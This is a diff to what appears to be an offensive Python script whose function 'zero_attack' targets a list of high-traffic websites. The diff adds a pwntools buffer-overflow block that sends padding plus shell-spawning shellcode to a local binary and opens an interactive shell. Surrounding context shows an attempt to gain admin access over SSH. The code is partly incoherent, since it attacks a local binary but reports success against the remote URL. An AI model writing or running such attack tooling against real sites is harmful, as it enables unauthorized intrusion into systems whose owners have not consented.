@@ -13,6 +13,7 @@ import paramiko
 import cv2
 import numpy as np
 import platform
+from pwn import *
 
 # List of high-traffic websites for testing
 default_urls = [
@@ -89,6 +90,26 @@ def zero_attack(url_or_ip):
         print(f"Sent hello message to {url_or_ip}, response code: {response.status_code}")
     except Exception as e:
         print(f"Failed to send hello message to {url_or_ip}: {e}")
+
+    # Buffer overflow example using pwntools
+    try:
+        # Example vulnerable binary
+        binary_path = './vulnerable_binary'
+        io = process(binary_path)
+
+        # Sample shellcode for demonstration
+        shellcode = asm(shellcraft.sh())
+        
+        # Example payload for buffer overflow
+        payload = b'A' * 100  # Adjust the buffer size accordingly
+        payload += shellcode
+        
+        # Send the payload
+        io.sendline(payload)
+        io.interactive()
+        print(f"Buffer overflow attack executed on {url_or_ip}")
+    except Exception as e:
+        print(f"Failed to execute buffer overflow on {url_or_ip}: {e}")
 
     # Attempt to gain admin access via SSH
     try:
